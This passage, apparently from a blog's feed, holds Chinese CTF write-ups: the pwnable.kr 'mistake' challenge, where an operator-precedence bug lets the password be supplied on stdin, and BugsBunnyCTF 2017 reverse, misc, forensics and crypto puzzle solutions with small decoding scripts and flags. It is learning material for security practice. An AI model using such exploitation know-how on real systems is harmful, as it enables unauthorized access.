class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">int</span> fd;</div><div class="line">	<span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</div><div class="line">	sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</div><div class="line"></div><div class="line">	<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</div><div class="line">	<span class="keyword">int</span> len;</div><div class="line">	<span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</div><div class="line">		close(fd);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"input password : "</span>);</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</div><div class="line"></div><div class="line">	<span class="comment">// xor your input</span></div><div class="line">	xor(pw_buf2, <span class="number">10</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</div><div class="line">		system(<span class="string">"/bin/cat flag\n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	close(fd);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>程序的功能，就是我们输入的十个字符进行xor处理后保存在pw_buf2中，与pw_buf进行比较，若相同则得到flag。</p>
-<p>问题出在下面这段代码中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>由于<code>&lt;</code>的优先级比<code>=</code>高，所以在open()执行完后，不论是否打开成功，其返回值都大于或者等于零。所以在与0比较后，fd的值为false，在c语言中，即为0。</p>
-<p>所以当程序执行到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;</div><div class="line">	printf(&quot;read error\n&quot;);</div><div class="line">	close(fd);</div><div class="line">	return 0;		</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>实际上执行的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(!(len=read(0,pw_buf,PW_LEN) &gt; 0))</div></pre></td></tr></table></figure></p>
-<p>而在unix中，0表示为标准输入流，<code>read(0,pw_buf,PW_LEN)</code>即为从标准输入流中读取字符并保存到pw_buf中。</p>
-<p>所以实际上，两个数组的内容都是我们输入的。</p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>第一次输入时输入十个字符，比如十个1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1111111111</div></pre></td></tr></table></figure></p>
-<p>第二次输入时输入第一次输入十个字符经过异或后的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0000000000</div></pre></td></tr></table></figure></p>
-<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mistake@ubuntu:~$ ./mistake</div><div class="line">do not bruteforce...</div><div class="line">2</div><div class="line">input password : 0</div><div class="line">Wrong Password</div><div class="line">mistake@ubuntu:~$ ./mistake</div><div class="line">do not bruteforce...</div><div class="line">1111111111</div><div class="line">input password : 0000000000</div><div class="line">Password OK</div><div class="line">Mommy, the operator priority always confuses me :(</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;操作符优先级问题。c语言中&lt;code&gt;=&lt;/code&gt;优先级为14，而&lt;code&gt;&amp;lt;&lt;/code&gt;优先级为6。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:bin" scheme="http://yoursite.com/categories/writeup-bin/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BugsBunnyCTF2017-Reverse-writeup</title>
-    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/"/>
-    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/</id>
-    <published>2017-07-30T11:46:02.000Z</published>
-    <updated>2017-08-01T07:33:18.379Z</updated>
-    
-    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
-<h1 id="only-guess"><a href="#only-guess" class="headerlink" title="only guess"></a>only guess</h1><p>用IDA打开<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/13.jpg?raw=true" alt=""></p>
-<p>dict数组保存了各种字符串：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/14.jpg?raw=true" alt=""></p>
-<p>基本逻辑就是读入的pass和数组dict比较，同时&amp;dest和数组dict的值比较，若一样则为good password。所以实际上&amp;dest就是我们要输入的值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> dest;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span>  src = <span class="number">0x736564656372656d</span>;</div><div class="line">    <span class="built_in">memcpy</span>(&amp;dest, &amp;src, <span class="number">9u</span>LL);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,&amp;dest);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>但是我测试时只输出了<code>mercede?(</code>，所以这不是最后的password，需要修正。想了一个曲线救国的方法。用命令<code>strings re50 &gt; tmp</code>把数组dict中的内容输出到tmp文件中，在tmp文件中查找开头为<code>mercede</code>的值。最终确定password为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mercedes</div></pre></td></tr></table></figure></p>
-<p>最终的flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;mercedes&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="rev100"><a href="#rev100" class="headerlink" title="rev100"></a>rev100</h1><p>拖进IDA查看。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170801/1.jpg?raw=true" alt=""></p>
-<p>main函数中，将A，B两处的字符串拷贝后进行异或并存储到C中。用下面的脚本得到flag：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">str1 = [<span class="number">0x61</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x77</span>,<span class="number">0x34</span>,<span class="number">0x2c</span>,<span class="number">0x5f</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x60</span>,<span class="number">0x7</span>,<span class="number">0x34</span>,<span class="number">0x7d</span>,<span class="number">0x12</span>,<span class="number">0x57</span>,<span class="number">0x7a</span>,<span class="number">0x22</span>,<span class="number">0x25</span>,<span class="number">0x4f</span>,<span class="number">0x28</span>]</div><div class="line">str2 = [<span class="number">0x23</span>,<span class="number">0x34</span>,<span class="number">0x27</span>,<span class="number">0x44</span>,<span class="number">0x32</span>,<span class="number">0x35</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x31</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x38</span>,<span class="number">0x37</span>,<span class="number">0x46</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x44</span>,<span class="number">0x50</span>,<span class="number">0x21</span>,<span class="number">0x55</span>]</div><div class="line"></div><div class="line">str3 = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</div><div class="line">	str3 += chr(str1[i] ^ str2[i])</div><div class="line"></div><div class="line"><span class="keyword">print</span> str3</div></pre></td></tr></table></figure>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;X0r_1s_fun&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;单刷好幸苦。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Reverse" scheme="http://yoursite.com/categories/writeup-Reverse/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="re" scheme="http://yoursite.com/tags/re/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BugsBunnyCTF2017-misc-writeup</title>
-    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-misc-writeup/"/>
-    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-misc-writeup/</id>
-    <published>2017-07-30T01:04:19.000Z</published>
-    <updated>2017-07-31T00:05:45.164Z</updated>
-    
-    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Not-found"><a href="#Not-found" class="headerlink" title="Not found"></a>Not found</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hidden in plain sight</div></pre></td></tr></table></figure>
-<p>在注册时时候就注意到有irc页面，连上去后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Th1s_1s_0ur_fl4g_f0rm4t&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="Primitive-encryption"><a href="#Primitive-encryption" class="headerlink" title="Primitive encryption"></a>Primitive encryption</h2><p>题目给了如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">What about a time travel ? ^^</div><div class="line">Your mission is to be very observative, sometimes a theory start from a supposition.</div><div class="line">Decrypt this and you will get your flag :</div><div class="line">i KTAX ZTRTRTC SuB AKXy KXlp you GiRViRF youN GlTF TRV iA&apos;C FFAKTAwTCXTCy</div><div class="line">To validate the challenge enter : Bugs_Bunny&#123;your_flag_uppercase&#125;</div></pre></td></tr></table></figure></p>
-<p>考虑语义，进行如下替换：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">K -&gt; h</div><div class="line">X -&gt; e</div><div class="line">N -&gt; r</div><div class="line">A -&gt; t</div><div class="line">C -&gt; s</div><div class="line">T -&gt; a</div><div class="line">R -&gt; R</div><div class="line">V -&gt; e</div><div class="line">G -&gt; F</div><div class="line">F -&gt; g</div></pre></td></tr></table></figure></p>
-<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">i hate Zararas SuB they help you fireirg your flag are it&apos;s ggthatwaseasy</div></pre></td></tr></table></figure></p>
-<p>将<code>ggthatwaseasy</code>改成大写加上外围后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;GGTHATWASEASY&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="Like-a-Boss"><a href="#Like-a-Boss" class="headerlink" title="Like a Boss !"></a>Like a Boss !</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Put the flag between Bugs_Bunny&#123;&#125;</div></pre></td></tr></table></figure>
-<h2 id="Locked-PDF"><a href="#Locked-PDF" class="headerlink" title="Locked PDF"></a>Locked PDF</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">My girlfriend sent me a locked PDF file ,Can you please helps me to read the content ,maybe something great waiting fro me ?!! :p</div></pre></td></tr></table></figure>
-<h1 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h1><h2 id="Stego10"><a href="#Stego10" class="headerlink" title="Stego10"></a>Stego10</h2><p>题目提供了一张图片。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/bug/steg# strings h4cker.jpg</div><div class="line">JFIF</div><div class="line">`Exif</div><div class="line">Google</div><div class="line">0220</div><div class="line">.Bugs_Bunny&#123;0258c4a75fc36076b41d02df8074372b&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="odd-amp-even-2"><a href="#odd-amp-even-2" class="headerlink" title="odd &amp; even 2"></a>odd &amp; even 2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">odd and even are two friends since ever.</div><div class="line">Can you detach them.</div><div class="line">Be the devil and do it.</div><div class="line"></div><div class="line">flag : BUGS_BUNNY&#123;&#125;</div></pre></td></tr></table></figure>
-<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="FOR25"><a href="#FOR25" class="headerlink" title="FOR25"></a>FOR25</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">I found this file in my computer ,could you please give me the flag ?!</div></pre></td></tr></table></figure>
-<p>直接用strings看一下。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/6.jpg?raw=true" alt=""></p>
-<p>用以下脚本提取出hex。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">file = open(&apos;hex&apos;,&apos;rb&apos;)</div><div class="line">output = open(&apos;output&apos;,&apos;wb&apos;)</div><div class="line">while True:</div><div class="line">	line = file.readline()</div><div class="line">	output.write(line[9:48]+&quot;\n&quot;)</div><div class="line">	if not line:</div><div class="line">		break</div><div class="line">file.close()</div><div class="line">output.close()</div></pre></td></tr></table></figure></p>
-<p>然后将output中的内容放到hex编辑器中并保存在压缩包文件。压缩包中有文件hex.png。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Y0u_D1D_1T_W3ll&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="UNKOWN-file"><a href="#UNKOWN-file" class="headerlink" title="UNKOWN file !!"></a>UNKOWN file !!</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">? em rof ti evlos esaelp uoy dluoc, rekcah boon a m&apos;I, elif egnarts a em dnes evah dneirf ym</div></pre></td></tr></table></figure>
-<p>题目是倒这个，这是个提示。用hex打开unknown文件，发现是个png文件，只是被倒序了。将其十六进制内容保存在<code>unknownhex.txt</code>中，用下面这个脚本转换一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">unknowhex = open(&apos;unkownhex.txt&apos;,&apos;rb&apos;)</div><div class="line">knowhex = open(&apos;knowhex.txt&apos;,&apos;wb&apos;)</div><div class="line">content = unknowhex.readline()</div><div class="line">content = content.split(&apos; &apos;)</div><div class="line">for i in content[::-1]:</div><div class="line">	knowhex.write(i+&apos; &apos;)</div><div class="line">unknowhex.close()</div><div class="line">knowhex.close()</div></pre></td></tr></table></figure></p>
-<p>再把knowhex.txt的内容放到hex编辑器中并保存成png文件。打开后是倒着的flag。最后的flag为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;E4Sy_T4Sk_F0R_H4X0r_L1KeS_Y0u&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="For80"><a href="#For80" class="headerlink" title="For80"></a>For80</h2><p>把gif传到这<a href="https://ezgif.com/split" target="_blank" rel="external">网站</a>后，进行split。但是图片很不清晰。然后我选择把分帧的图片下载下来。其目录结构差不多如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/8.jpg?raw=true" alt=""><br>然后用下面这个脚本写个html页面，用这些分帧图片进行填充。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">html = open(<span class="string">"flag.html"</span>,<span class="string">"wb"</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">310</span>):</div><div class="line">	img = <span class="string">'&lt;img src="img/frame_'</span> + str(i)+ <span class="string">'_delay-0.01s.gif" /&gt;'</span></div><div class="line">	html.writelines(img)</div><div class="line">html.close()</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/9.jpg?raw=true" alt=""></p>
-<p>有些地方重叠了，但不妨碍最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;S3nD_NuDes_DuD3&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="Give-me-the-Flag"><a href="#Give-me-the-Flag" class="headerlink" title="Give me the Flag !"></a>Give me the Flag !</h2><p>task85的压缩包解压出来后有个flag.rar和flag文件夹。flag文件夹里有各种国旗还有二维码碎片。而flag.rar被加密了。初步推测通过回复二维码来解密压缩包。拼了好久。。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/10.jpg?raw=true" alt=""></p>
-<p>扫码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">== 34Sy_P4SSW0Rd_H4X0r ==</div></pre></td></tr></table></figure></p>
-<p>直接解压得到的flag.txt里有flag。直接打开压缩包里面有个readme.txt，输入密码后其内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01000010 01110101 01100111 01110011 01011111 01000010 01110101 01101110 01101110 01111001 01111011 00110010 01100010 00111001 00110111 00110010 00110110 00110011 01100010 01100101 01100010 00110111 00110000 01100100 00110000 01100110 00110110 00110101 00111001 01100010 01100100 01100010 00111001 00110011 01100011 01100011 00110101 00110010 00111001 00110001 01100100 00110000 01100001 01111101</div></pre></td></tr></table></figure></p>
-<p>放到 <a href="http://tool.ph0en1x.com" target="_blank" rel="external">http://tool.ph0en1x.com</a> 上解一下，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;2b97263beb70d0f659bdb93cc5291d0a&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="Programation"><a href="#Programation" class="headerlink" title="Programation"></a>Programation</h1><h2 id="ZERO-ONE"><a href="#ZERO-ONE" class="headerlink" title="ZERO-ONE !"></a>ZERO-ONE !</h2><p>写程序把ZERON,ONE换成对应的0，1，之后再解码就行了。脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">progfile = open(<span class="string">"progTask.txt"</span>,<span class="string">"rb"</span>)</div><div class="line">content = progfile.readline()</div><div class="line">print(content.replace(<span class="string">"ZERO"</span>,<span class="string">'0'</span>).replace(<span class="string">"ONE"</span>,<span class="string">"1"</span>).replace(<span class="string">" "</span>,<span class="string">""</span>))</div></pre></td></tr></table></figure></p>
-<p>在 <a href="http://tool.ph0en1x.com" target="_blank" rel="external">http://tool.ph0en1x.com</a> 放入bin一栏，在ascii一栏得到如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QnVnc19CdW5ueXswNWZlODIzOGNmZWUxZTVmMDRiNjUzMzliZWE0ZmVkMn0=</div></pre></td></tr></table></figure></p>
-<p>进行base64解码，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;05fe8238cfee1e5f04b65339bea4fed2&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;单刷好幸苦。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BugsBunnyCTF2017-crypto-writeup</title>
-    <link href="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-crypto-writeup/"/>
-    <id>http://yoursite.com/2017/07/30/BugsBunnyCTF2017-crypto-writeup/</id>
-    <published>2017-07-29T23:49:21.000Z</published>
-    <updated>2017-07-31T00:01:23.275Z</updated>
-    
-    <content type="html"><![CDATA[<p>单刷好幸苦。<br><a id="more"></a></p>
-<h1 id="Crypto-15"><a href="#Crypto-15" class="headerlink" title="Crypto-15"></a>Crypto-15</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Some classics crypto task ! Cesar maybe !!</div><div class="line">Author : Sold1er</div><div class="line">crypto-15.txt</div></pre></td></tr></table></figure>
-<p>进行一次rot13后得到原文：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(story, shift)</span>:</span></div><div class="line">  <span class="keyword">return</span> <span class="string">''</span>.join([</div><div class="line">            (<span class="keyword">lambda</span> c, is_upper: c.upper() <span class="keyword">if</span> is_upper <span class="keyword">else</span> c)</div><div class="line">                (</div><div class="line">                  (<span class="string">"abcdefghijklmnopqrstuvwxyz"</span>*<span class="number">2</span>)[ord(char.lower()) - ord(<span class="string">'a'</span>) + shift % <span class="number">26</span>],</div><div class="line">                  char.isupper()</div><div class="line">                )</div><div class="line">            <span class="keyword">if</span> char.isalpha() <span class="keyword">else</span> char</div><div class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> story</div><div class="line">        ])</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(story,key)</span>:</span></div><div class="line">	<span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	key = [_YOUR_KEY_HERE_]</div><div class="line">	<span class="keyword">print</span> decode(<span class="string">"Piug_Pibbm&#123;Q35oF_3BQ0R3_4F3_B0H_G3QiF3_OH_4ZZ&#125;"</span>,key)</div></pre></td></tr></table></figure></p>
-<p>对<code>Piug_Pibbm{Q35oF_3BQ0R3_4F3_B0H_G3QiF3_OH_4ZZ}</code>进行凯撒解码。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;C35aR_3NC0D3_4R3_N0T_S3CuR3_AT_4LL&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="Crypto-20"><a href="#Crypto-20" class="headerlink" title="Crypto-20"></a>Crypto-20</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;----. &gt;+++++++++++++++++. --------------. ++++++++++++. --------------------. &lt;. &gt;++++++++++++++++++++++. -------. . +++++++++++. ++. &lt;. &gt;---------. &lt;--------------. ---. +++++++++++++++++++++++++++++. +++++++++++++++++. -------------------------. &gt;+++. &lt;&lt;++++++++++++. . &gt;&gt;++++++++.</div></pre></td></tr></table></figure>
-<p>brainfuck解码，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Br41N_Fu**&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="Crypto-25"><a href="#Crypto-25" class="headerlink" title="Crypto-25"></a>Crypto-25</h1><p>题目文件下载下来后打开发现是ook编码，放到下面网站中解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://tool.ph0en1x.com/brainfuck/</div></pre></td></tr></table></figure></p>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;Ju5T_OoK!&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="Scy-way"><a href="#Scy-way" class="headerlink" title="Scy way"></a>Scy way</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Decrypt My Secret And Win!</div><div class="line"></div><div class="line">IHUDERMRCPESOLLANOEIHR</div><div class="line"></div><div class="line">Bugs_Bunny&#123;flag&#125;</div><div class="line">Author: TnMch</div></pre></td></tr></table></figure>
-<p>栅栏密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IHUDERMRCPE</div><div class="line">SOLLANOEIHR</div></pre></td></tr></table></figure></p>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Bugs_Bunny&#123;ISHOULDLEARNMORECIPHER&#125;</div></pre></td></tr></table></figure></p>
